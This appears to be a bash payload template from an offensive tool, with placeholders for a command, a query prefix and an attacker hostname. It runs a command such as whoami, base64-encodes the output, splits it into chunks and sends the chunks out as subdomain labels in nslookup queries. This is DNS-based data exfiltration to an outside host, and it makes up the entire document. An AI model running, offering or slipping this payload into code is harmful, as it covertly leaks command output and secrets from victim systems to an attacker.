%whoami% 2>&1|base64|while read r; do
	i=0;
	k=0;
	while [ $i -lt ${#r} ]; do
		j=0;
		p=%q%$k.;
		k=$[k+1];
		while [ $i -lt ${#r} ]&&[ $j -lt 3 ];do
			p=$p${r:$i:61}.;
			i=$[i+61];
			j=$[j+1];
		done
		nslookup ${p}%hostname%;
	done;
done;